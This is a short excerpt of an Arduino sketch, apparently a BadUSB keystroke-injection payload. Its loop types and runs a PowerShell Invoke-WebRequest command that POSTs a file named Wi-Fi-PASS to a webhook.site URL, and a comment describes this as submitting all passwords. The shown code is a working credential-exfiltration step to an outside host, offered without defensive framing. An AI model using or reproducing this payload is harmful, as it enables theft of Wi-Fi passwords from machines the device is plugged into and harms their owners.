...
void loop() {
  ...
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/661dc0d9-3bcf-41a3-a397-9f31b2488219 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  typeKey(KEY_RETURN);
  delay(300);
